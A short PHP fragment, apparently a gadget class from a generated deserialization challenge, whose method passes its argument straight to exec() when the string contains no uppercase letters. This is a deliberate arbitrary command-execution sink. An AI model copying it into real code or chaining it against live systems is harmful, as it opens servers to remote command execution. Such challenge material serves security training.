...
class Pop33{
public function is_str_lowercase($u0){for($p1=0;$p1<strlen($u0);$p1++){if(ord($u0[$p1])>=ord('A')&&ord($u0[$p1])<=ord('Z')){return false;}}return true;}
public function Lpoiliter($i2){if(self::is_str_lowercase($i2)===true){exec($i2,$w3);return $w3;}}
}
